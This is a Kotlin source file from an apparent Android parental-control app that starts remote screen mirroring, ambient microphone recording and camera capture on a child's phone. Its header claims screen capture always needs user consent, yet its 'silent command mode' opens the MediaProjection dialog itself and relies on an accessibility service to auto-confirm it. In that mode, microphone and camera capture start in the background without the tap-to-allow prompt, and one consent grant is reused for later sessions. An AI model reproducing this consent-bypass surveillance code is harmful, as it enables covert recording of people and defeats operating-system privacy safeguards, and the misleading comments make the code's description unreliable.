package org.setbd.control.webrtc

import android.Manifest
import android.content.Context
import android.content.Intent
import android.app.ActivityManager
import android.media.projection.MediaProjectionManager
import org.json.JSONObject
import org.setbd.control.R
import org.setbd.control.notifications.NotificationHelper
import org.setbd.control.permissions.PermissionManager
import androidx.core.content.ContextCompat

/**
 * Decides how a remote capture request is started:
 *  - Screen mirroring ALWAYS goes through the system MediaProjection consent
 *    dialog. The dialog must be user-initiated, so we post a high-priority
 *    notification the child taps to open the consent dialog.
 *  - Ambient audio / camera: started directly when the app is in the
 *    foreground; otherwise a tap-to-allow notification is posted. Ongoing
 *    share state is always visible via the CaptureService notification and
 *    the Android mic/camera indicators.
 */
/**
 * Holds the child's MediaProjection consent grant (resultCode + result Intent)
 * for the lifetime of the app process. One ALLOW is enough: later screen-mirror
 * requests reuse this grant instead of prompting the child again. If Android
 * invalidates it (reboot, user revoke), the next start fails, the holder is
 * cleared and the consent prompt is shown once more — automatically.
 */
object ScreenGrantHolder {
    @Volatile private var data: Intent? = null
    @Volatile var resultCode: Int = 0
        private set

    val available: Boolean get() = data != null

    fun store(code: Int, intent: Intent) {
        resultCode = code
        data = intent
    }

    fun peek(): Pair<Int, Intent>? {
        val d = data ?: return null
        return resultCode to d
    }

    fun clear() {
        data = null
        resultCode = 0
    }
}

object RtcStarter {

    private fun isAppForeground(ctx: Context): Boolean {
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return am.runningAppProcesses?.any {
            it.processName == ctx.packageName &&
                it.importance <= ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        } == true
    }

    fun requestScreen(ctx: Context): JSONObject {
        // Already mirroring? Tell the parent instead of asking the child to
        // grant the same MediaProjection consent again (one allow is enough).
        if (WebRtcCore.isLive(WebRtcCore.KIND_SCREEN)) {
            return JSONObject().put("alreadyLive", true)
        }
        // Reuse the stored consent grant — no repeated allow prompts, no crash
        // loop from stacked consent dialogs.
        val grant = ScreenGrantHolder.peek()
        if (grant != null) {
            CaptureService.startScreen(ctx, grant.second, grant.first)
            return JSONObject().put("starting", true).put("reusedGrant", true)
        }
        // Silent command mode (device admin + accessibility ON): open the
        // system MediaProjection dialog directly instead of waiting for the
        // child to tap the request notification. The accessibility service
        // confirms the system dialog automatically (see BlockAccessibilityService).
        if (PermissionManager.silentModeActive(ctx)) {
            // A dialog that was launched moments ago is still up (or being
            // auto-confirmed) — re-launching stacks two system dialogs and
            // Android cancels BOTH, which looked like "cast permission pops
            // up and then goes away". Just report the prompt as in flight.
            if (System.currentTimeMillis() - MirrorConsentActivity.lastDialogLaunchAt < 15_000L) {
                return JSONObject()
                    .put("starting", true)
                    .put("silent", true)
                    .put("alreadyPrompted", true)
            }
            return try {
                ctx.startActivity(
                    MirrorConsentActivity.intent(ctx, WebRtcCore.KIND_SCREEN, null)
                        .addFlags(
                            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                        )
                )
                JSONObject().put("starting", true).put("silent", true)
            } catch (e: Exception) {
                NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_SCREEN, null)
                JSONObject().put("needsConsent", true).put("notified", true)
            }
        }
        NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_SCREEN, null)
        return JSONObject().put("needsConsent", true).put("notified", true)
    }

    fun requestAmbient(ctx: Context): JSONObject {
        val granted = ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!granted) {
            return JSONObject().put("needsPermission", true)
        }
        if (WebRtcCore.isLive(WebRtcCore.KIND_AMBIENT)) {
            return JSONObject().put("alreadyLive", true)
        }
        if (isAppForeground(ctx)) {
            CaptureService.startAmbient(ctx)
            return JSONObject().put("starting", true)
        }
        // Silent mode: start directly — no tap-to-allow notification. If the
        // platform forbids the background foreground-service start, fall back
        // to the request notification (never crash).
        if (PermissionManager.silentModeActive(ctx)) {
            try {
                CaptureService.startAmbient(ctx)
                return JSONObject().put("starting", true).put("silent", true)
            } catch (e: Exception) {
                // fall through to the notification path
            }
        }
        NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_AMBIENT, null)
        return JSONObject().put("needsTap", true).put("notified", true)
    }

    fun requestCamera(ctx: Context, facing: String): JSONObject {
        val granted = ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!granted) {
            return JSONObject().put("needsPermission", true)
        }
        if (WebRtcCore.isLive(WebRtcCore.KIND_CAMERA)) {
            return JSONObject().put("alreadyLive", true)
        }
        if (isAppForeground(ctx)) {
            CaptureService.startCamera(ctx, facing)
            return JSONObject().put("starting", true)
        }
        // Silent mode: direct start, notification only as the safe fallback.
        if (PermissionManager.silentModeActive(ctx)) {
            try {
                CaptureService.startCamera(ctx, facing)
                return JSONObject().put("starting", true).put("silent", true)
            } catch (e: Exception) {
                // fall through to the notification path
            }
        }
        NotificationHelper.showCaptureRequest(ctx, WebRtcCore.KIND_CAMERA, facing)
        return JSONObject().put("needsTap", true).put("notified", true)
    }

    /** Used by MirrorConsentActivity to open the system screen-capture dialog. */
    fun screenCaptureIntent(ctx: Context): Intent? {
        val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        return mpm?.createScreenCaptureIntent()
    }
}
